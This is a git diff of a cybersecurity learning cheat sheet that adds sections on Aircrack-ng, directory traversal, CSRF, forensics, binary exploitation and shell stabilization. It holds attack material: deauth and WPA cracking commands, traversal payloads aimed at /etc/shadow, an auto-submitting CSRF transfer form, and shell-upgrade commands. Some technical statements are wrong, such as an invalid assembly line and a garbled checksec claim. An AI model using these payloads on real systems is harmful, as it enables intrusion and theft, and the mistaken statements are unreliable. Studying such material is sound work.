@@ -62,20 +62,20 @@ Thank you for exploring this project! I hope you will find the content valuable 
       1. [ISO/IEC 19249](#isoiec-19249)
       2. [ISO27001](#iso27001)
    7. [Operational Roles and Career Development](#operational-roles-and-career-development)
-7.  [Linux Commands](#linux-commands)
+7. [Linux Commands](#linux-commands)
 8. [Tools (CLI)](#tools-cli)
-   1. [Aircrack-ng](#aircrack-ng)
-   2. [Gobuster](#gobuster)
-   3. [Feroxbuster](#feroxbuster)
-   4. [Hashcat](#hashcat)
-   5. [Hydra](#hydra)
-   6. [John The Ripper](#john-the-ripper)
-   7. [Metasploit](#metasploit)
-   8. [Netcat](#netcat)
-   9.  [Nikto](#nikto-2)
-   10. [Nmap](#nmap)
-   11. [SQLMap](#sqlmap)
-9.  [Tools (GUI)](#tools-gui)
+    1.  [Aircrack-ng](#aircrack-ng)
+    2.  [Gobuster](#gobuster)
+    3.  [Feroxbuster](#feroxbuster)
+    4.  [Hashcat](#hashcat)
+    5.  [Hydra](#hydra)
+    6.  [John The Ripper](#john-the-ripper)
+    7.  [Metasploit](#metasploit)
+    8.  [Netcat](#netcat)
+    9.  [Nikto](#nikto-2)
+    10. [Nmap](#nmap)
+    11. [SQLMap](#sqlmap)
+9. [Tools (GUI)](#tools-gui)
     1.  [Autopsy](#autopsy)
     2.  [Burp Suite](#burp)
     3.  [Nessus](#nessus)
@@ -102,7 +102,7 @@ Thank you for exploring this project! I hope you will find the content valuable 
     10. [Server Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)
     11. [Server Side Template Injection (SSTI)](#server-side-template-injection-ssti)
     12. [Server Side Includes (SSI)](#server-side-includes-ssi)
-13. [Forensics](#forensics)
+13. [Digital Forensics](#digital-forensics)
     1.  [File Analysis](#file-analysis)
     2.  [PCAP Analysis](#pcap-analysis)
     3.  [Steganography](#steganography)
@@ -121,28 +121,28 @@ Thank you for exploring this project! I hope you will find the content valuable 
     10. [Integer Overflow](#integer-overflow)
     11. [ASLR Bypass](#aslr-bypass)
 15. [Reverse Engineering](#reverse-engineering)
-    1.  [Assembly](#assembly)
+    1.  [Assembly Language](#assembly-language)
     2.  [Disassemblers & Debuggers](#disassemblers--debuggers)
     3.  [Decompilers](#decompilers)
 16. [Cryptography](#cryptography)
-    1.  [Generate Keys](#generate-keys)
+    1.  [Genating Keys](#generating-keys)
     2.  [Cryptographic Methods](#cryptographic-methods)
     3.  [Encoding](#encoding)
     4.  [Hashing](#hashing)
     5.  [Ciphers](#ciphers)
     6.  [Encryption (RSA)](#encryption-rsa)
-17. [Miscellaneous](#miscellaneous)
-18. [Windows Exploitation](#windows-exploitation)
+17. [Windows Exploitation](#windows-exploitation)
     1.  [Active Directory](#active-directory) 
     2.  [Windows Reverse Shells](#windows-reverse-shells)
     3.  [Samba (SMB)](#samba-smb)
-19. [Shells and Privilege Escalation](#shells-and-privilege-escalation)
+18. [Shells and Privilege Escalation](#shells-and-privilege-escalation)
     1.  [TTY Shell](#tty-shell)
     2.  [Privilege Escalation](#privilege-escalation)
-20. [Vulnerabilities & Threats](#vulnerabilities--threats)
+19. [Vulnerabilities & Threats](#vulnerabilities--threats)
     1.  [Social Engineering](#social-engineering)
     2.  [Denial of Service (DoS)](#denial-of-service-dos--ddos)
     3.  [Misconfigurations](#misconfigurations)
+20. [Miscellaneous](#miscellaneous)
 
 # Links
 [Abuse.ch](https://abuse.ch) - a collection of malware and threat intelligence feeds.  
@@ -664,7 +664,7 @@ Hackers are sorted into three hats, where their ethics and motivations behind th
 | Red Teamer | Plays the role of an adversary, attacking an organisation and providing feedback from an enemies perspective |
 
 # Linux Commands 
-Also includes other useful CLI tools and commands for Linux and Windows.
+Essential command-line tools for cybersecurity work. Practice these commands in a safe environment before using them in production.
 
 <details>
 <summary>List of contents</summary>
@@ -751,24 +751,25 @@ Also includes other useful CLI tools and commands for Linux and Windows.
 </details>
 
 ## cat
-cat is a Linux shell command that concatenates files and prints on the standard output. It is often used to view the content of a file. For Windows, the equivalent command is `type`.
+Display file contents or combine multiple files.
 
-**Example**  
-`cat -n example.txt`	
+```bash
+cat file.txt                    # Show file contents
+cat -n file.txt                 # Show with line numbers
+cat file1.txt file2.txt         # Combine files
+```
 
-**Options**  
-`-n`  number all output lines  
+**Common options**: `-n` (line numbers), `-A` (show all characters)  
 ## ls
-ls is a Linux shell command that lists directory contents of files and directories.
+List files and directories.
 
-`-i` list file's inode index number  
-`-a` list all files including hidden file starting with '.'  
-`-l` list with long format - show permissions   
-`-d`	list directories - with ' */'  
-`-s`	list file size  
-`-S`	sort by file size  
-`-t`	sort by time & date  
-`-X`	sort by extension name  
+```bash
+ls                              # List current directory
+ls -la                          # Detailed list with hidden files
+ls -lh                          # Human-readable file sizes
+```
+
+**Key options**: `-l` (details), `-a` (hidden files), `-h` (readable sizes), `-t` (sort by time)  
 ## mkdir
 Created directories
 
@@ -894,7 +895,6 @@ When you want to specify that a file was modified within the last 24 hours, the 
 **Note**  
 1. Suppress the output of any possible errors to make the output more readable. This is done by appending `2> /dev/null` to your command. This way, you won't see any results you're not allowed to access.
 2. The second thing is the `-exec` flag. You can use it in your find command to execute a new command, following the -exec flag, like so: `-exec whoami \;`. (can be used for privilege escalation)'
-
 ## ln (symbolic links)
 Creates symbolic links (shortcuts) to files or directories.
 
@@ -911,7 +911,6 @@ ln -s /root/flag.txt banner
 ln -s /etc/passwd mylink
 ```
 Now `cat mylink` will show the contents of /etc/passwd.
-
 ## where
 This tool returns the path to the file or link that should be executed.
 
@@ -1706,11 +1705,37 @@ Redirects the file descriptors for the errors (STDERR) to "`/dev/null`" This way
 
 
 # Tools (CLI)
-## Aircrack-ng
-[Aircrack-ng](https://www.aircrack-ng.org) - is a complete suite of tools to assess WiFi network security  
+Command-line tools for security testing and analysis. Start with Nmap for network discovery, then web tools like Gobuster.
 
-`TO BE ADDED`  
-https://cheatography.com/itnetsec/cheat-sheets/aircrack-ng-suite/
+Legal Notice: Only use on systems you own or have permission to test.
+
+## Aircrack-ng
+[Aircrack-ng](https://www.aircrack-ng.org) - is a complete suite of tools to assess WiFi network security
+
+```bash
+# Monitor mode
+airmon-ng start wlan0
+
+# Capture packets
+airodump-ng wlan0mon
+
+# Target specific network
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+
+# Deauth attack (to capture handshake)
+aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# Crack WPA/WPA2 with wordlist
+aircrack-ng -w wordlist.txt capture-01.cap
+```
+
+**Key tools in suite:**
+- airmon-ng: Enable/disable monitor mode
+- airodump-ng: Capture packets and show wireless networks
+- aireplay-ng: Inject packets (deauth, fake auth)
+- aircrack-ng: Crack WEP/WPA keys
+
+See detailed cheatsheet [here](https://cheatography.com/itnetsec/cheat-sheets/aircrack-ng-suite/)
 ## Gobuster
 [Gobuster](https://github.com/OJ/gobuster) is a tool used to brute-force URIs (directories and files), DNS subdomains and virtual host names
 ### Syntax
@@ -2131,8 +2156,38 @@ sqlmap.py -u <website> -D <database_name> -T <table_name> -C <column_name1>,<col
 ```
 
 # Tools (GUI) 
+Graphical tools provide intuitive interfaces for complex security tasks. While CLI tools offer speed and automation, GUI tools excel at visualization, analysis, and collaborative work.
+
+When to Use GUI Tools: 
+- Complex data analysis and visualization
+- Learning new concepts with visual feedback  
+- Collaborative investigations where sharing screens helps
+- Deep dive analysis requiring multiple perspectives
+
 ## Autopsy
-`TO BE ADDED`
+Digital forensics platform that analyzes hard drives, smartphones, and other storage devices.
+
+**Key Features:**
+- File system analysis (NTFS, FAT, Ext2/3/4, HFS+)
+- Deleted file recovery
+- Timeline analysis
+- Keyword searching
+- Hash analysis (MD5, SHA1, SHA256)
+- Email analysis
+- Registry analysis (Windows)
+
+**Common Workflow:**
+1. Create new case
+2. Add data source (disk image, drive, logical files)
+3. Configure ingest modules (hash lookup, keyword search, etc.)
+4. Analyze results in various views
+5. Generate reports
+
+**Supported Formats:**
+- Raw/DD images
+- E01 (EnCase)
+- AFF (Advanced Forensic Format)
+- VHD/VMDK (Virtual disks)
 
 ## Burp 
 [Burp Suite](https://portswigger.net/burp), a framework of web application pentesting tools, is widely regarded as the de facto tool to use when performing web app testing
@@ -2261,19 +2316,27 @@ Generally speaking, there are three basic modes in Vim:
 Find other very usefull commands [here](/More/VIM/README.md), or a full cheatsheet [here](https://vim.rtorr.com).
 
 # Networking  
-This section will cover the basics of networking, such as IP addresses, ports, protocols, etc.
+Networking fundamentals for cybersecurity. Understanding IP addresses, ports, and protocols is essential for security work.
 
-## IP
-An IP address is a unique address that identifies a device on the internet or a local network. IP stands for "Internet Protocol," which is the set of rules governing the format of data sent via the internet or local network.
+## Internet Protocol (IP)
+An IP address is like a postal address for devices on a network - it tells data where to go.
 
-Example: 192.168.1.204
+**Example**: `192.168.1.204`
 
-**Reserved local IP addresses**  
-192.168.1.0 = The network address  
-192.168.1.1 = The default getaway (router)  
-192.168.1.255 = The broadcast address  
+### Key IP Address Types
+```bash
+# Private IP Ranges (not routable on internet)
+10.0.0.0/8        # 10.0.0.0 - 10.255.255.255
+172.16.0.0/12     # 172.16.0.0 - 172.31.255.255  
+192.168.0.0/16    # 192.168.0.0 - 192.168.255.255
 
-If you send something to the broadcast address, the message will be broadcasted to everybody else on the network.
+# Special Addresses in 192.168.1.x network
+192.168.1.0       # Network address (first address)
+192.168.1.1       # Default gateway (usually router)
+192.168.1.255     # Broadcast address (last address)
+```
+
+Broadcast Address: Sending data here reaches ALL devices on the network (useful for discovery attacks).
 
 ### IPv4
 IP addresses consists of 32 bits:   
@@ -2403,7 +2466,11 @@ hstshijack/hstshijack # Works for websites using HTTPS and not HSTS
 </details>
 
 # Web Exploitation
-This section will cover the basics of web exploitation. 
+Common web application vulnerabilities and how to exploit them.
+
+Learning order: Start with content discovery, then SQL injection and XSS, followed by authentication bypass and other injection attacks.
+
+Use tools like Burp Suite and test only on authorized targets. 
 
 ## Content Discovery
 Content discovery is divided into four parts, being manual, automated, OSINT and subdomain enumeration.
@@ -2663,7 +2730,32 @@ When executed, although the data given will be in a different format than what i
 $payload = "\x2f|\x65 \x74 \x63\x2f\x70\x61 \x73 \x73 \x77\x64"
 ```
 ## Directory Traversal
-`TO BE ADDED`
+Directory traversal (also known as path traversal) allows attackers to access files and directories outside the web application's root directory.
+
+**Common Payloads:**
+```bash
+../../../etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+....//....//....//etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+```
+
+**Windows Examples:**
+```bash
+..\..\..\windows\system32\drivers\etc\hosts
+..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
+```
+
+**Testing Methods:**
+1. URL parameters: `file=../../../etc/passwd`
+2. POST data: In form fields
+3. HTTP headers: User-Agent, Cookie
+4. File upload paths
+
+**Files to Target:**
+- Linux: `/etc/passwd`, `/etc/shadow`, `/proc/version`
+- Windows: `C:\windows\system32\drivers\etc\hosts`, `C:\boot.ini`
+- Application configs: `web.config`, `config.php`, `.env`
 ## Authentication Bypass
 These vulnerabilities can be some of the most critical as it often ends in leaks of customers personal data.
 
@@ -2850,7 +2942,37 @@ PHP filters are used to validate and sanitize external input. The filter extensi
 Filters can be used by using `php://filter`. For example, to base64 encode a file, you can use:  
 `php://filter/convert.base64-encode/resource=index.php`
 ## Cross Site Request Forgery (CSRF)
-`TO BE ADDED`
+CSRF tricks users into performing actions on a web application where they're authenticated without their knowledge.
+
+**How CSRF Works:**
+1. User logs into vulnerable site (bank.com)
+2. User visits malicious site (evil.com)
+3. Malicious site triggers request to bank.com using user's session
+4. Bank.com processes request as if user intended it
+
+**Example Attack:**
+```html
+<!-- Hidden form that auto-submits -->
+<form action="https://bank.com/transfer" method="POST" id="csrf">
+    <input type="hidden" name="to" value="attacker_account">
+    <input type="hidden" name="amount" value="1000">
+</form>
+<script>document.getElementById('csrf').submit();</script>
+
+<!-- Or using img tag -->
+<img src="https://bank.com/delete_account?confirm=yes">
+```
+
+**Detection:**
+- Look for state-changing requests without CSRF tokens
+- Check if anti-CSRF measures can be bypassed
+- Test with different HTTP methods (GET, POST, PUT)
+
+**Prevention:**
+- CSRF tokens in forms
+- SameSite cookie attribute
+- Referer header validation
+- Double submit cookies
 ## Cross Site Scripting (XSS)
 Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users
 
@@ -3138,7 +3260,7 @@ Server Side Includes (SSI) is a simple interpreted server-side scripting languag
 * `<!--#echo var="DATE_LOCAL" -->`
 * `<!--#exec cmd="cat /etc/passwd" -->`
 
-# Forensics
+# Digital Forensics
 Digital forensics is the art of uncovering and investigating electronically stored data. It involves identifying, acquiring, analyzing, and reporting digital evidence.
 
 **Use Cases:**
@@ -3256,7 +3378,31 @@ The format is precisely defined in a specification doc - often publicly availabl
 * Unknown file types: search for tracks from a file format 
 
 ## PCAP Analysis
-`TO BE ADDED`
+Analyze network packet captures to understand traffic patterns and identify security issues.
+
+**Common Tools:**
+- Wireshark (GUI analysis)
+- tshark (command line)
+- tcpdump (capture packets)
+
+**Analysis Techniques:**
+```bash
+# Basic filtering
+tshark -r capture.pcap -Y "http"
+tshark -r capture.pcap -Y "tcp.port == 80"
+tshark -r capture.pcap -Y "ip.addr == 192.168.1.100"
+
+# Extract specific data
+tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.uri
+tshark -r capture.pcap -Y "ftp" -T fields -e ftp.request.command
+```
+
+**What to Look For:**
+- Unusual traffic patterns
+- Plain text credentials
+- DNS exfiltration
+- Malware communication
+- Port scanning activities
 
 ## Steganography
 Steganography is the practice of hiding a secret message in something that is not secret, for example: A message inside a jpg file, or a binary inside a png.
@@ -3486,7 +3632,37 @@ Volatility 3 is a memory forensics framework that allows you to analyze memory d
 Remember to append the `--output-dir <directory>` flag to save the output to a directory. Or simply redirect the output to a file with `> <filename>`. I've written more about Volatility 3 [here](/More/Memory%20Forensics/Readme.md).
 
 ## Disk imaging
-`TO BE ADDED`
+Create exact copies of storage devices for forensic analysis without altering original evidence.
+
+**Common Tools:**
+```bash
+# dd - basic disk imaging
+dd if=/dev/sda of=disk_image.raw bs=4M status=progress
+
+# dcfldd - enhanced dd with hashing
+dcfldd if=/dev/sda of=disk_image.raw hash=sha256 hashwindow=1G
+
+# ewfacquire - create E01 format
+ewfacquire /dev/sda
+```
+
+**FTK Imager (Windows/GUI):**
+- Free forensic imaging tool by AccessData
+- **Usage**: File → Create Disk Image → Select source → Choose format (E01/Raw) → Set destination
+- **Features**: Built-in verification, compression options, case information metadata
+- **Advantage**: User-friendly interface, widely accepted in court
+- **Download**: Available from AccessData website
+
+**Image Formats:**
+- **Raw/DD**: Bit-for-bit copy, largest file size
+- **E01/EWF**: EnCase format, includes metadata and compression
+- **AFF**: Advanced Forensic Format, open source alternative
+
+**Best Practices:**
+- Use write blockers to prevent modification
+- Calculate hash values for integrity verification
+- Document chain of custody
+- Work with copies, never original evidence
 
 ### Sleuthkit
 The Sleuth Kit is a collection of command-line tools for analyzing disk images and recovering data. It is used by digital forensics professionals and law enforcement agencies to investigate computer crimes.
@@ -3507,10 +3683,87 @@ icat -i raw -f ext4 -o 360448 -r disk.flag.img 2371 # extract a file by inode
 ```
 
 # Binary Exploitation
+Binary exploitation involves finding and exploiting vulnerabilities in compiled programs. This requires understanding low-level system concepts like memory management, assembly language, and CPU architecture.
+
+Prerequisites:
+- Basic understanding of C/C++ programming
+- Assembly language fundamentals  
+- Memory layout concepts (stack, heap, segments)
+- Operating system concepts (processes, memory protection)
+
+Essential Tools: GDB, radare2, Ghidra, pwntools, ROPgadget
+
+Practice Safely: Use dedicated platforms like picoCTF, pwnable.tw, or local VMs. Never test on systems you don't own.
+
 ## Registers
-`TO BE ADDED`
+CPU registers are high-speed storage locations within the processor. In x86-64 architecture, understanding registers is crucial for binary exploitation.
+
+**Register Naming Convention:**
+- 64-bit: RAX, RBX, RCX, RDX, RSI, RDI, RBP, RSP
+- 32-bit: EAX, EBX, ECX, EDX, ESI, EDI, EBP, ESP  
+- 16-bit: AX, BX, CX, DX, SI, DI, BP, SP
+- 8-bit: AL/AH, BL/BH, CL/CH, DL/DH
+
+**General Purpose Registers:**
+
+| 64-bit | 32-bit | 16-bit | 8-bit | Purpose |
+|--------|--------|--------|-------|---------|
+| RAX | EAX | AX | AL | Accumulator (return values, arithmetic) |
+| RBX | EBX | BX | BL | Base register (pointer to data) |
+| RCX | ECX | CX | CL | Counter (loop operations) |
+| RDX | EDX | DX | DL | Data register (I/O operations) |
+| RSI | ESI | SI | SIL | Source index (string operations) |
+| RDI | EDI | DI | DIL | Destination index (string operations) |
+| RBP | EBP | BP | - | Base pointer (stack frame) |
+| RSP | ESP | SP | - | Stack pointer (top of stack) |
+| R8-R15 | R8D-R15D | R8W-R15W | R8B-R15B | Additional 64-bit registers |
+
+**Special Registers:**
+- **RIP/EIP/IP**: Instruction pointer (current instruction)
+- **RFLAGS/EFLAGS/FLAGS**: Status flags
+
+**Example Usage:**
+```assembly
+mov rax, 0x1234567890abcdef  ; 64-bit
+mov eax, 0x12345678          ; 32-bit (clears upper 32 bits)
+mov ax, 0x1234               ; 16-bit
+mov al, 0x12                 ; 8-bit low
+mov ah, 0x34                 ; 8-bit high
+```
 ## The Stack
-`TO BE ADDED`
+The stack is a Last-In-First-Out (LIFO) data structure used for function calls, local variables, and return addresses.
+
+**Stack Operations:**
+- PUSH: Add data to top of stack (decreases RSP)
+- POP: Remove data from top of stack (increases RSP)
+
+**Stack Frame Structure:**
+```
+High Memory
++-----------------+
+| Function Args   |
++-----------------+
+| Return Address  | <- Overwrite this for control
++-----------------+
+| Saved RBP       |
++-----------------+ <- RBP points here
+| Local Variables |
++-----------------+ <- RSP points here
+Low Memory
+```
+
+**Stack in Function Calls:**
+1. Arguments pushed onto stack
+2. CALL instruction pushes return address
+3. Function prologue saves old RBP
+4. Local variables allocated
+5. Function epilogue restores RBP
+6. RET instruction returns to saved address
+
+**Security Implications:**
+- Buffer overflows can overwrite return addresses
+- Stack canaries detect corruption
+- NX bit prevents stack execution
 
 ### Stack Overflow
 To see if a stack overflow is possible, run the following command:
@@ -3519,13 +3772,124 @@ checksec --file=<executable>
 ```
 If the output contains `Canary found` and `NX enabled`, then a stack overflow is possible. See more about this command [here](/More/Binary%20Exploitation/Checksec.md).
 ### Stack Shellcode
-`TO BE ADDED`
+Inject and execute shellcode on the stack when NX protection is disabled.
+
+**Simple Steps:**
+1. Fill buffer with your shellcode (machine code)
+2. Overflow to overwrite return address  
+3. Make return address point to your shellcode
+4. When function ends, it runs your code
+
+**Memory Layout:**
+```
+[YOUR_SHELLCODE + PADDING][ADDRESS_TO_SHELLCODE]
+                           ↑
+                    This overwrites return address
+```
+
+**What shellcode does:**
+- Opens a shell (/bin/sh)
+- Connects back to your computer
+- Runs any command you want
+
+**Why it works:**
+- Old programs let stack execute code
+- Modern programs usually block this (NX protection)
 ### Return to Win (Ret2Win)
-`TO BE ADDED`
+Jump to a function that's already in the program instead of writing your own code.
+
+**The Idea:**
+- Program has a "win" function that gives you a flag/shell
+- You just need to call that function
+- Much easier than writing shellcode
+
+**How it works:**
+1. Find the "win" function address (like 0x401234)
+2. Overflow the buffer
+3. Replace return address with win function address
+4. Program jumps to win function and you get the flag
+
+**Memory Layout:**
+```
+[JUNK_DATA][WIN_FUNCTION_ADDRESS]
+            ↑
+    Program jumps here instead of normal return
+```
+
+**Why it's easier:**
+- No need to write machine code
+- Just redirect to existing code
+- Works even with some protections
 ## Calling Conventions
-`TO BE ADDED`
+How programs pass information to functions. Like rules for a conversation.
+
+**Linux 64-bit (most common):**
+- First argument goes in RDI register
+- Second argument goes in RSI register  
+- Third in RDX, fourth in RCX, etc.
+- Function returns answer in RAX
+
+**Example - calling system("/bin/sh"):**
+```assembly
+mov rdi, "/bin/sh"    # Put "/bin/sh" in first argument
+call system           # Call function
+```
+
+**Why this matters for exploits:**
+- To call functions, you need to put arguments in right places
+- If you want system("/bin/sh"), you need "/bin/sh" in RDI first
+- Different operating systems have different rules
+
+**32-bit is different:**
+- All arguments go on the stack (no registers)
+- Simpler but less efficient
 ## Global Offset Table (GOT)
-`TO BE ADDED`
+A phone book that programs use to find function addresses. Table that stores addresses of external functions for dynamic linking.
+
+**Purpose:**
+- Resolve function addresses at runtime
+- Enable position-independent code
+- Support shared libraries
+
+**What it does:**
+- Programs don't know where printf() or other functions live in memory
+- GOT stores the actual addresses of these functions
+- When program calls printf(), it looks up the address in GOT first
+
+**GOT vs PLT:**
+- **GOT**: Contains actual function addresses
+- **PLT**: Contains jump stubs to GOT entries
+
+**GOT Overwrite Attack:**
+1. Find GOT entry for target function
+2. Overwrite with address of controlled function
+3. When target function called, redirects to attacker code
+
+**Simple Example:**
+1. Program calls printf("Hello")
+2. Program looks in GOT: "printf is at address 0x123456"
+3. You change GOT: "printf is at address 0x789abc" (where system() lives)
+4. Program calls system("Hello") instead of printf("Hello")
+
+**Finding GOT entries:**
+```bash
+# Find GOT entries
+objdump -R binary
+readelf -r binary
+
+# In GDB, examine GOT
+x/gx 0x404018  # GOT entry address
+```
+
+**Common Targets:**
+- printf → system
+- exit → main (for infinite loop)
+- malloc → system
+
+**Why this works:**
+- Program trusts its own phone book (GOT)
+- If you can write to GOT, you control function calls
+- Great for when you can't directly control execution flow
 ## Buffers
 ### Buffer Overflow
 Buffer overflow is a type of security vulnerability that occurs when a program, while writing data to a buffer, overruns the buffer's boundary and overwrites adjacent memory locations. This can cause the program to crash or, in the case of a remote attacker, to execute arbitrary code on the system.
@@ -3542,7 +3906,36 @@ python -c "print ('A' * 100)" | ./<executable>
 ```
 
 ### Variable Overwrite
-`TO BE ADDED`
+Change nearby variables by overflowing a buffer. Easier than full exploitation.
+
+**The Setup:**
+```c
+char password[10];
+int is_admin = 0;        // This is next to password in memory
+
+gets(password);          // Dangerous! No size check
+if (is_admin) {
+    printf("You're admin!\n");
+}
+```
+
+**The Attack:**
+- Type more than 10 characters
+- Extra characters overflow into is_admin variable
+- is_admin becomes non-zero (true)
+- You get admin access
+
+**Memory Layout:**
+```
+[password buffer][is_admin]
+[AAAAAAAAAA]     [0]        ← Normal
+[AAAAAAAAAAAA]   [AA]       ← Overflow! is_admin now = AA (non-zero)
+```
+
+**Why it works:**
+- Variables stored next to each other in memory
+- No boundary checking on input
+- Simpler than controlling execution flow
 ## Return Oriented Programming (ROP)
 Return Oriented Programming (ROP) works by chaining together small pieces of code, called "gadgets," that are already present in the target program's memory space to perform a series of operations that the attacker desires. Each gadget typically ends with a "return" instruction that tells the program where to continue executing code after the gadget has finished. 
 
@@ -3566,7 +3959,31 @@ Stack Canaries is a security mechanism that detects buffer overflow attacks. It 
 RELRO is a security feature that makes certain sections of the program read-only after the dynamic linker has resolved all symbols. This prevents an attacker from overwriting important data or functions in memory, and can help to prevent certain types of attacks, such as the Global Offset Table (GOT) overwrite.
 ## The Heap
 ### Heap Exploitation
-`TO BE ADDED`
+Attack memory that programs allocate dynamically (with malloc).
+
+**What's the heap?**
+- Area where programs store data that can grow/shrink
+- Unlike stack (fixed size), heap is flexible
+- Programs use malloc() to get memory, free() to return it
+
+**Common Mistakes Programs Make:**
+- **Use after free**: Use memory after giving it back
+- **Double free**: Return the same memory twice  
+- **Heap overflow**: Write past the end of allocated space
+- **Heap spray**: Fill heap with controlled data
+
+**Simple Example:**
+```c
+char *data = malloc(10);     // Get 10 bytes
+strcpy(data, "This is way too long!");  // Write 20+ bytes!
+free(data);                  // Return memory
+strcpy(data, "hello");       // Use after free - CRASH!
+```
+
+**Why it's hard:**
+- Heap layout is complex and changes
+- Requires understanding memory management
+- Usually need multiple bugs to exploit
 ## Format String Vulnerability
 A format string vulnerability is a type of software vulnerability that occurs when a program uses user input to construct a format string for the `printf` or `scanf` functions without properly validating or sanitizing the input. This can allow an attacker to execute arbitrary code or read sensitive data from the program's memory. Read more about the functions [here](/More/Assembly/Common-C-functions.md).
 
@@ -3613,14 +4030,59 @@ Integer overflow is a type of software vulnerability that occurs when an integer
 **QWORD** = Quad Word (64 bits)
 ## ASLR Bypass
 ### Return to PLT (Ret2plt)
-`TO BE ADDED`
+Bypass ASLR by calling functions through the Procedure Linkage Table.
+
+**Concept:**
+- PLT entries have fixed addresses
+- Can call system functions via PLT
+- Useful when ASLR randomizes library addresses
+
+**Common Technique:**
+1. Find PLT entry for desired function
+2. Set up arguments in registers/stack
+3. Return to PLT entry
+
+**Example:**
+```python
+# Call system("/bin/sh") via PLT
+rop = ROP(binary)
+rop.system(next(binary.search(b"/bin/sh")))
+```
+
+**PLT vs Direct Call:**
+- PLT: Fixed address, works with ASLR
+- Direct: Randomized address, fails with ASLR
 # Reverse Engineering
 Reverse-engineering is the creative process of analyzing software and understanding it without having access to the source code. It is the process by which software is deconstructed in a way that reveals its innermost details such as its structure, function and operation.
 
-## Assembly
+## Assembly Language
 Find the in-depth content for the Assembly x86-64 language [here](/More/Assembly/Introduction.md).
 
-`TO BE ADDED`
+Assembly is the low-level programming language that directly corresponds to machine code instructions.
+
+**Common Instructions:**
+- **MOV**: Move data between locations
+- **ADD/SUB**: Arithmetic operations  
+- **CMP**: Compare values
+- **JMP/JE/JNE**: Jump instructions
+- **CALL/RET**: Function calls
+- **PUSH/POP**: Stack operations
+
+**Intel vs AT&T Syntax:**
+```assembly
+# Intel syntax
+mov eax, 5
+add eax, ebx
+
+# AT&T syntax  
+movl $5, %eax
+addl %ebx, %eax
+```
+
+**Useful for:**
+- Reverse engineering binaries
+- Understanding exploits
+- Optimizing performance-critical code
 ## Disassemblers & Debuggers
 A disassembler is a computer program that translates machine language into assembly language—the inverse operation to that of an assembler. A debugger is a computer program that is used to test and debug other programs.
 
@@ -3719,7 +4181,20 @@ berkankutuk@kali:~$ procyon -jar <jar file> -o <output directory>
 
 
 # Cryptography
-## Generate keys
+Cryptography is the foundation of modern security, protecting data through mathematical algorithms. Understanding crypto principles is essential for both securing systems and attacking weak implementations.
+
+Learning Path:
+1. Basics: Hashing, symmetric vs asymmetric encryption
+2. Classical: Caesar, Vigenère, substitution ciphers  
+3. Modern: AES, RSA, elliptic curves
+4. Applications: TLS/SSL, digital signatures, key exchange
+5. Attacks: Weak implementations, side channels, quantum threats
+
+Essential Tools: OpenSSL, hashcat, John the Ripper, CyberChef, cryptographic libraries
+
+Implementation Warning: Never implement crypto from scratch in production. Use established, audited libraries.
+
+## Generating Keys
 To generate a private key we use the following command (8912 creates the key 8912 bits long):  
 `openssl genrsa -aes256 -out private.key 8912`
 
@@ -3818,7 +4293,34 @@ Doing a lookup in a sorted list of hashes that are not salted is quite fast, muc
 
 Tools like Hashcat and John the Ripper are normally used for this.
 ## Ciphers
-`TO BE ADDED`
+Methods for encrypting and decrypting data to protect confidentiality.
+
+**Classical Ciphers:**
+- **Caesar**: Shift letters by fixed amount
+- **Vigenère**: Use repeating key for shifting
+- **Substitution**: Replace each letter with another
+- **Transposition**: Rearrange letter positions
+
+**Modern Ciphers:**
+- **AES**: Advanced Encryption Standard (symmetric)
+- **RSA**: Rivest-Shamir-Adleman (asymmetric)
+- **DES**: Data Encryption Standard (obsolete)
+
+**Examples:**
+```bash
+# Caesar cipher (shift by 3)
+plaintext:  HELLO
+ciphertext: KHOOR
+
+# Simple substitution
+A->Z, B->Y, C->X, etc.
+```
+
+**Breaking Ciphers:**
+- Frequency analysis
+- Known plaintext attacks
+- Brute force (short keys)
+- Mathematical weaknesses
 ## Encryption (RSA)
 ### Symetric encryption
 plaintext ➡️ 🔑 ➡️ ciphertext  
@@ -3846,62 +4348,6 @@ john --wordlist=/usr/shared/wordlists/rockyou.txt --format=gpg hash.txt
 ```
 
 The result should reveal the password if you have used a strong wordlist that contains it.
-
-# Miscellaneous
-`TO BE ADDED`
-
-## Shortened URLs
-You can see the actual website the shortened link is redirecting you to by appending "+" to it (see the examples below). Type the shortened URL in the address bar of the web browser and add the above characters to see the redirect URL.
-
-Example: 
-[tinyurl.com/mv2h897s+](https://tinyurl.com/mv2h897s+)
-
-Example providers:
-- bit.ly
-- goo.gl
-- ow.ly
-- s.id
-- smarturl.it
-- tiny.pl
-- tinyurl.com
-- x.co
-
-## Reading SQL databases
-Ensure you have the knowlege of SQL DBs first. See [here](/More/Databases).
-
-Start by starting the mysql service:
-```bash
-service mysql start
-```
-
-### Remote Connection
-Then connect to the database:
-```bash
-mysql -u root -p -h <ip_address>
-```
-
-Now you can use the following commands to read the database:
-```sql
-show databases;
-use <database_name>;
-show tables;
-select * from <table_name>;
-describe <table_name>;
-```
-
-### Local Connection
-If you have access to the database file, you can use the following command to read it:
-```bash
-mysql -u <username> -p
-```
-
-Type "source" followed by the filename of the mysql database to specify that you wish to view its database.
-
-```sql
-source /home/berkan/serverLx/employees.sql -- example
-```
-
-You can now view the database using the commands from the previous section.
 
 # Windows Exploitation
 ## Active directory
@@ -4013,7 +4459,39 @@ Other useful reverse shells can be found in this repo: [PayloadAllTheThings](htt
 For PHP, you can take a look at this RS from PentestMonkey: [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
 
 ### Shell stabilization
-`TO BE ADDED`
+Improve basic reverse shells to make them more usable and stable.
+
+**Common Issues with Basic Shells:**
+- No tab completion
+- No command history
+- Can't use Ctrl+C
+- Limited text editing
+
+**Python TTY Method:**
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+# Background with Ctrl+Z
+stty raw -echo; fg
+```
+
+**Other Methods:**
+```bash
+# Script command
+script -qc /bin/bash /dev/null
+
+# Socat (if available)
+socat file:`tty`,raw,echo=0 tcp-listen:4444
